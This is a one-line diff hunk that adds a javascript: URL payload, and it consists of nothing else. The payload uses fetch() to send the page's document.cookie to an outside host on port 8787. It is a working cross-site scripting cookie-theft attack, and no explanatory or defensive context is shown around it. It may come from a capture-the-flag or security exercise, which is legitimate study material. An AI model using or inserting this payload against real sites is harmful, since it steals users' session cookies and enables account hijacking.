@@ -1,0 +1,1 @@
+javascript:fetch('//dev.vincent55.tw:8787?a='+document.cookie)
